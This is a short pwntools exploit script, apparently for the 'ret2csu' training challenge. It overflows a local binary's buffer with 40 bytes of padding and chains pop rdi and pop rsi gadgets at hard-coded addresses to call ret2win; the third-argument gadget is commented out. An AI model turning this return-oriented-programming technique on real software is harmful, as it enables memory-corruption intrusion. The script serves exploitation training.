from pwn import *

context(arch='amd64', os='linux')
binary_name = 'ret2csu'
p = process('./'+binary_name)
# gdb.attach(p, 'break main')
elf =  ELF(binary_name)
rop =  ROP(elf)

third_argument = 0xdeadcafebabebeef
ret2win =   elf.sym["ret2win"]
log.info("ret2win: "+  hex(ret2win))

# 0x00000000004008a3: pop rdi; ret; 
pop_rdi = 0x4008a3
# 0x00000000004008a1 : pop rsi ; pop r15 ; ret
pop_rsi_r15 = 0x4008a1

rop =  "A"*40
rop += p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(2) + p64(2) #+ p64(pop_rdx) + p64(third_argument) 
rop += p64(ret2win)

received = p.recvuntil("> ")
#print received
p.sendline(rop)

p.interactive()